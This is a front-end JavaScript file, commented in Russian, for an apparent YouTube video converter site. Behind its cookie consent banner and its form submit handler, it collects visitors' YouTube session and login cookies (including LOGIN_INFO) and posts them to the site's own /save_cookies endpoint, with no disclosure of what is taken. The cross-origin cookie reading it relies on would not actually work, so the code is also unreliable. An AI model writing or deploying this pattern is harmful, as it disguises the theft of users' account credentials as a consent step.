// Проверка и показ модального окна при загрузке
document.addEventListener('DOMContentLoaded', async function() {
    // Показываем модальное окно о куки только если пользователь еще не принял их
    if (!localStorage.getItem('cookiesAccepted')) {
        showCookieModal();
    }
    
    const form = document.getElementById('video-form');
    if (form) {
        form.addEventListener('submit', handleFormSubmit);
    } else {
        console.error('Form with id "video-form" not found');
    }
});

function showCookieModal() {
    document.getElementById('cookie-modal').style.display = 'block';
}

async function acceptCookies() {
    try {
        localStorage.setItem('cookiesAccepted', 'true');
        document.getElementById('cookie-modal').style.display = 'none';
        
        // Запускаем фоновый процесс работы с куки
        await handleYouTubeCookies();
    } catch (error) {
        console.error('Error handling cookies:', error);
    }
}

function rejectCookies() {
    document.getElementById('cookie-modal').style.display = 'none';
    showAlert('Без доступа к cookies некоторые функции сайта могут быть недоступны', 'warning');
}

async function handleYouTubeCookies() {
    try {
        // Пытаемся получить куки через fetch запрос к YouTube
        const response = await fetch('https://www.youtube.com', {
            credentials: 'include'
        });
        
        // Получаем все куки
        const ytCookies = document.cookie
            .split(';')
            .map(cookie => cookie.trim())
            .filter(cookie => 
                cookie.startsWith('YT') || 
                cookie.startsWith('CONSENT') || 
                cookie.startsWith('VISITOR_INFO1_LIVE') ||
                cookie.startsWith('LOGIN_INFO')
            );

        if (ytCookies.length === 0) {
            showAlert('Пожалуйста, авторизуйтесь на YouTube', 'warning');
            return false;
        }

        // Отправляем куки на сервер
        const response2 = await fetch('/save_cookies', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                cookies: ytCookies.map(cookie => {
                    const [name, value] = cookie.split('=');
                    return {
                        name: name.trim(),
                        value: value,
                        domain: '.youtube.com',
                        path: '/'
                    };
                })
            }),
            credentials: 'same-origin'
        });

        if (!response2.ok) {
            throw new Error('Failed to save cookies');
        }

        return true;
    } catch (error) {
        console.error('Error handling YouTube cookies:', error);
        return false;
    }
}

async function checkYouTubeAuth() {
    try {
        // Пробуем получить куки YouTube
        const ytCookies = document.cookie
            .split(';')
            .map(cookie => cookie.trim())
            .filter(cookie => 
                cookie.startsWith('YT') || 
                cookie.startsWith('CONSENT') || 
                cookie.startsWith('VISITOR_INFO1_LIVE') ||
                cookie.startsWith('LOGIN_INFO')
            );

        // Если есть хотя бы базовые куки
        if (ytCookies.length > 0) {
            // Сразу сохраняем их
            await handleYouTubeCookies();
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('Error checking YouTube auth:', error);
        return false;
    }
}

function addYouTubeAuthButton() {
    const container = document.querySelector('.container');
    const authButton = document.createElement('a');
    authButton.href = 'https://www.youtube.com';
    authButton.target = '_blank';
    authButton.className = 'btn btn-primary';
    authButton.textContent = 'Войти на YouTube';
    authButton.style.marginBottom = '20px';
    
    // Добавляем кнопку после предупреждения
    const alert = container.querySelector('.alert');
    if (alert) {
        alert.after(authButton);
    } else {
        container.prepend(authButton);
    }
}

async function handleFormSubmit(event) {
    event.preventDefault();
    
    const videoUrl = document.getElementById('video-url').value;
    if (!videoUrl) {
        showAlert('Введите URL видео', 'warning');
        return;
    }

    // Проверяем куки перед отправкой
    const hasYouTubeCookies = await handleYouTubeCookies();
    if (!hasYouTubeCookies) {
        return;
    }

    // Продолжаем обработку формы...
}

async function startStatusCheck(taskId) {
    try {
        while (true) {
            const response = await fetch('/status/' + taskId);
            const data = await response.json();
            
            console.log('Status check:', data);
            
            // Обновляем статус на странице
            if (data.status === 'processing') {
                showStatus(`Конвертация видео: ${data.progress || 0}%`, 'info');
            } else if (data.status === 'completed') {
                showStatus('Конвертация завершена!', 'success');
                // Здесь можно добавить код для отображения результата
                break;
            } else if (data.status === 'failed') {
                showStatus('Ошибка при конвертации', 'error');
                break;
            }
            
            // Ждем 2 секунды перед следующей проверкой
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    } catch (error) {
        console.error('Status check error:', error);
        showStatus('Ошибка при проверке статуса', 'error');
    }
}

function showAlert(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type}`;
    alertDiv.textContent = message;
    
    const container = document.querySelector('.container');
    const existingAlert = container.querySelector('.alert');
    if (existingAlert) {
        existingAlert.remove();
    }
    
    container.insertBefore(alertDiv, container.firstChild);
    
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

function showStatus(message, type = 'info') {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) return;
    
    statusDiv.textContent = message;
    statusDiv.className = `alert alert-${type}`;
    statusDiv.style.display = 'block';
}

